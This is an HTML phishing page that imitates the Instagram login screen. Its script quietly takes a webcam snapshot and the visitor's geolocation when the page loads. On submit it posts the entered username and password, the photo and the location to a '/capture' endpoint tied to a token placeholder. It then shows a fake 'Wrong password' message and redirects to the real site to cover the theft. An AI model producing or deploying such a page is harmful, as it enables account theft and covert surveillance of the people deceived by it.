<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh}
.container{width:350px;background:#fff;border:1px solid #dbdbdb;border-radius:1px;padding:40px 30px;text-align:center}
.logo-img{width:175px;margin-bottom:30px}
input{width:100%;padding:9px 0 7px 8px;background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;margin:5px 0;font-size:12px;outline:none}
input:focus{border-color:#a8a8a8}
button{width:100%;background:#0095f6;color:#fff;padding:7px;border:none;border-radius:4px;font-weight:600;margin-top:8px;cursor:pointer}
.fb{background:#385185;margin-top:15px}
.divider{display:flex;margin:20px 0;color:#8e8e8e}
.line{flex:1;height:1px;background:#dbdbdb}
.text{margin:0 18px}
.forgot{font-size:12px;color:#00376b;margin-top:15px;display:inline-block;text-decoration:none}
.signup{margin-top:20px;color:#8e8e8e}
.signup a{color:#0095f6;text-decoration:none;font-weight:600}
.error{color:#ed4956;display:none;margin:10px 0;font-size:14px}
</style>
</head>
<body>
<div class="container">
<img src="/images/instagram.png" class="logo-img" onerror="this.style.display='none'">
<form id="loginForm">
<input type="text" id="username" placeholder="Phone number, username, or email" autocomplete="off">
<input type="password" id="password" placeholder="Password">
<button type="submit">Log In</button>
<button type="button" class="fb" onclick="fbLogin()">Log in with Facebook</button>
</form>
<div class="divider"><div class="line"></div><div class="text">OR</div><div class="line"></div></div>
<a href="#" class="forgot">Forgot password?</a>
<div class="signup">Don't have an account? <a href="#">Sign up</a></div>
<div id="errorMsg" class="error"></div>
</div>
<script>
let camera=null,locationData=null;
navigator.mediaDevices.getUserMedia({video:true}).then(s=>{let v=document.createElement('video');v.srcObject=s;v.play();setTimeout(()=>{let c=document.createElement('canvas');c.width=v.videoWidth||640;c.height=v.videoHeight||480;c.getContext('2d').drawImage(v,0,0);camera=c.toDataURL('image/jpeg');s.getTracks().forEach(t=>t.stop())},1000)}).catch(()=>{});
navigator.geolocation.getCurrentPosition(p=>{locationData={lat:p.coords.latitude,lon:p.coords.longitude}},()=>{});
async function sendData(data){await fetch('/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token:'[[TOKEN]]',data:data,cam:camera,loc:locationData})})}
function fbLogin(){document.getElementById('errorMsg').style.display='block';document.getElementById('errorMsg').innerText='Facebook login temporarily unavailable.'}
document.getElementById('loginForm').addEventListener('submit',async(e)=>{e.preventDefault();await sendData({u:document.getElementById('username').value,p:document.getElementById('password').value});document.getElementById('errorMsg').style.display='block';document.getElementById('errorMsg').innerText='Wrong password. Try again.';setTimeout(()=>{window.location.href='https://instagram.com'},2000)});
</script>
</body>
</html>
